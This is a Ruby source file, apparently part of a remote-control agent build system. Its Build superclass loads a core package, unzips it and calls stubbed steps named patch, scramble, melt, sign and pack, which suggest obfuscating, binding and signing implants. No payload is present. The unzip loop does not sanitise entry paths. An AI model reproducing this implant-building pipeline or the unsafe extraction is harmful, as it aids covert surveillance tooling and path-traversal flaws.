#
#  Agent creation superclass
#

# from RCS::Common
require 'rcs-common/trace'

require 'fileutils'
require 'tmpdir'
require 'zip/zip'
require 'zip/zipfilesystem'

module RCS
module DB

class Build
  include RCS::Tracer

  attr_reader :outputs
  attr_reader :platform
  attr_reader :tmpdir
  attr_reader :factory
  
  def initialize
    @outputs = []
  end

  def load(params)
    core = ::Core.where({name: @platform}).first
    raise "Builder for #{@platform} not found" if core.nil?

    @core = GridFS.to_tmp core[:_grid].first
    trace :debug, "Build: loaded core: #{@platform} #{core.version} #{@core.size} bytes"

    @factory = ::Item.where({_kind: 'factory', ident: params['ident']}).first
    raise "Factory #{params['ident']} not found" if @factory.nil?
    
    trace :debug, "Build: loaded factory: #{@factory.name}"
  end

  def unpack
    @tmpdir = File.join Dir.tmpdir, "%f" % Time.now
    trace :debug, "Build: creating: #{@tmpdir}"
    Dir.mkdir @tmpdir

    trace :debug, "Build: unpack: #{@core.path}"

    Zip::ZipFile.open(@core.path) do |z|
      z.each do |f|
        f_path = File.join(@tmpdir, f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
        @outputs << f.name
      end
    end

    # delete the tmpfile of the core
    @core.close!
  end

  def patch(params)
    trace :debug, "super #{__method__}"
  end

  def scramble
    trace :debug, "super #{__method__}"
  end

  def melt
    trace :debug, "super #{__method__}"
  end

  def sign 
    trace :debug, "super #{__method__}"
  end

  def pack
    trace :debug, "super #{__method__}"
  end

  def clean
    trace :debug, "Build: cleaning up #{@tmpdir}"
    FileUtils.rm_rf @tmpdir
  end

  def create(params)
    trace :debug, "Building Agent: #{params}"

    begin
      load params['factory']
      unpack
      patch params['binary']
      scramble
      melt
      sign
      pack
    rescue Exception => e
      trace :error, "Cannot build: #{e.message}"
      clean
      raise
    end
    
  end

end

end #DB::
end #RCS::
